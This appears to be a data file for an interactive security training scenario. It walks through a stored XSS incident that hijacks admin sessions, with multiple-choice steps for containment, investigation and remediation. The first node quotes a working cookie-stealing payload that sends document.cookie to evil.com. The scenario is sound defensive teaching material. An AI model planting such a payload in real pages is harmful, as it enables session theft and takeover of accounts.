title: xss
description: A stored XSS payload injected into a public comment field executes in admin browsers, stealing session cookies and hijacking administrator accounts.

timeline.title: Admin Session Anomaly
timeline.description: SIEM detects admin account logins from unfamiliar IP addresses. Admins report not recognising recent actions performed in their accounts.

timeline.title: XSS Payload Identified
timeline.description: Security review of the comment database finds a stored JavaScript payload that exfiltrates document.cookie to an external server.

timeline.title: Session Tokens Stolen
timeline.description: External server logs show admin session tokens being received. Four admin accounts are confirmed compromised via cookie theft.

timeline.title: Payload Removed, Sessions Invalidated
timeline.description: Malicious comment deleted. All admin sessions invalidated. Admin accounts locked pending credential resets.

timeline.title: Output Encoding Deployed
timeline.description: Developer patches all user-supplied content rendering to use context-aware output encoding. CSP header added.

timeline.title: Security Testing Complete
timeline.description: XSS scanner run across all input fields. No additional vulnerabilities found. Incident closed with lessons learned documented.

node-1.title: Admin Accounts Behaving Anomalously
node-1.situation: SIEM alerts show admin account activity from unfamiliar IPs. Two admins report actions in their accounts they did not perform. You discover a stored JavaScript payload in the product comment section: <script>fetch('https://evil.com/?c='+document.cookie)</script>
node-1.question: What is your immediate action?

options.label: A
options.text: Invalidate all admin sessions immediately, delete the malicious comment, and lock admin accounts pending investigation and password resets.

options.label: B
options.text: Edit the malicious comment to remove the script tag while keeping sessions active to avoid disrupting administrators.

options.label: C
options.text: Block the external IP receiving the stolen cookies and continue monitoring without touching the XSS payload.

node-2.title: Determine Actions Taken by Attackers
node-2.situation: Four admin accounts had their session tokens stolen. The attackers used these sessions for up to 2 hours. You must determine what privileged actions were performed during the hijacked sessions.
node-2.question: How do you investigate the session hijacking impact?

options.label: A
options.text: Review the audit logs for all four compromised admin accounts during the hijacking window to identify unauthorised changes, data access, or account modifications.

options.label: B
options.text: Reset the admin passwords and assume no serious changes were made since admins would have noticed immediately.

node-3.title: Remediate the XSS Vulnerability
node-3.situation: Audit logs show attackers browsed user data and exported a customer list. The XSS vulnerability must now be fixed. The root cause is unencoded output of user-supplied content in the comments section.
node-3.question: How do you remediate the XSS vulnerability?

options.label: A
options.text: Apply context-aware output encoding (HTML entity encoding) for all user-supplied content, implement a strict Content Security Policy, and audit all input rendering points for similar issues.

options.label: B
options.text: Add a WAF rule to strip <script> tags from comments as the sole remediation measure.

node-4.title: Implement Ongoing XSS Protections
node-4.situation: The immediate vulnerability is patched. Now you need to implement developer training and tooling to prevent future XSS vulnerabilities from being introduced.
node-4.question: What do you implement for long-term prevention?

options.label: A
options.text: Integrate XSS-focused SAST rules into CI/CD, enforce HttpOnly and Secure cookie flags for all session tokens, and conduct developer secure coding training.

options.label: B
options.text: Rely on the CSP header alone to mitigate future XSS without changing development practices or cookie attributes.

node-5.title: Scenario Complete
node-5.situation: The stored XSS attack was contained. Compromised admin sessions were invalidated, the payload removed, and the vulnerability patched with context-aware output encoding and CSP. Ongoing SAST, HttpOnly cookies, and developer training now prevent recurrence.
node-5.question: Scenario complete. Well done!
